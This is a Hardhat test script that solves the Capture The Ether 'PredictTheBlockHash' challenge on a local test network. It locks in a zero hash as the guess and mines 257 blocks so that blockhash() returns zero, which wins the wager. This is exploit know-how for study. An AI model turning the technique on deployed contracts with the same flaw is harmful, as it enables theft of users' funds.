const {
  loadFixture,
  mine,
} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Capture The Ether - PredictTheBlockHashChallenge", function () {
  async function deployContract() {
    const [deployer] = await ethers.getSigners();

    const PredictTheBlockHashChallenge = await ethers.getContractFactory(
      "PredictTheBlockHashChallenge"
    );
    const predictTheBlockHashChallenge =
      await PredictTheBlockHashChallenge.deploy({
        value: ethers.constants.WeiPerEther,
      });
    await predictTheBlockHashChallenge.deployed();

    return { deployer, predictTheBlockHashChallenge };
  }

  describe("Exploit", function () {
    it("Successful guess", async function () {
      const { deployer, predictTheBlockHashChallenge } = await loadFixture(
        deployContract
      );

      expect(await predictTheBlockHashChallenge.isComplete()).to.equal(false);
      await predictTheBlockHashChallenge
        .connect(deployer)
        .lockInGuess(
          "0x0000000000000000000000000000000000000000000000000000000000000000",
          { value: ethers.constants.WeiPerEther }
        );
      await mine(257);
      await predictTheBlockHashChallenge.connect(deployer).settle();
      expect(await predictTheBlockHashChallenge.isComplete()).to.equal(true);
    });
  });
});
